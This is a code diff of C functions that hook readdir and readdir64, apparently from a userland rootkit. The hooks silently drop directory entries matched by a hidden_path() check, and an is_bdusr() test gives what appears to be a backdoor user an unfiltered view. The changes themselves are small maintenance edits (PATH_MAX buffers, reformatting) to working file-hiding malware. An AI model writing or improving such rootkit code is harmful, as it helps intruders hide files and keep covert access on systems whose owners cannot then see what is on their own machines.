@@ -1,5 +1,5 @@
 struct dirent *readdir(DIR *dirp){
-    char path[4097], *filename;
+    char path[PATH_MAX], *filename;
     struct dirent *dir;
 
     hook(CREADDIR);
@@ -8,10 +8,11 @@ struct dirent *readdir(DIR *dirp){
         dir = call(CREADDIR, dirp);
         if(is_bdusr()) return dir;
         if(dir == NULL) continue;
-        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0")) continue;
+        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
+            continue;
 
         filename = gdirname(dirp);
-        snprintf(path, sizeof(path)-1, "%s/%s", filename, dir->d_name);
+        snprintf(path, sizeof(path) - 1, "%s/%s", filename, dir->d_name);
         free(filename);
     } while(dir && hidden_path(path));
 
@@ -19,7 +20,7 @@ struct dirent *readdir(DIR *dirp){
 }
 
 struct dirent64 *readdir64(DIR *dirp){
-    char path[4097], *filename;
+    char path[PATH_MAX], *filename;
     struct dirent64 *dir;
 
     hook(CREADDIR64);
@@ -28,10 +29,11 @@ struct dirent64 *readdir64(DIR *dirp){
         dir = call(CREADDIR64, dirp);
         if(is_bdusr()) return dir;
         if(dir == NULL) continue;
-        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0")) continue;
+        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
+            continue;
 
         filename = gdirname(dirp);
-        snprintf(path, sizeof(path)-1, "%s/%s", filename, dir->d_name);
+        snprintf(path, sizeof(path) - 1, "%s/%s", filename, dir->d_name);
         free(filename);
     }while(dir && hidden_path(path));
 
